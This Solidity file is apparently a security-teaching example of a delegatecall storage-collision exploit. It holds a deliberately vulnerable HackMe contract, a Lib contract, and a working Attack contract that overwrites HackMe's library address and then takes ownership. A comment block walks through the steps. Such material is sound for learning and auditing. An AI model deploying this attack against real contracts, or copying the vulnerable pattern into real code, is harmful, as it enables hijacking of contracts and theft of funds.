// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/

// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract HackMe {
    address public lib; // slot 0
    address public owner; // slot 1
    uint public someNumber; // slot 2

    constructor(address _libAddress) {
        lib = _libAddress;
        owner = msg.sender;
    } 

    function doSomething(uint _num) public {
        // should use the full names of the types, not their aliases 
        // so it should be uint256 instead of uint
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Lib {
    uint public someNumber; // slot 0

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(address _hackMeAddress) {
        hackMe = HackMe(_hackMeAddress);
    }

    function attack() public {
        hackMe.doSomething(uint(uint160(address(this))));
        hackMe.doSomething(1);
    }

    function doSomething(uint _num) public {
        // Attack -> HackMe --- delegatecall --> Attack
        //           msg.sender = Attack         msg.sender = Attack
        owner = msg.sender;
    }
}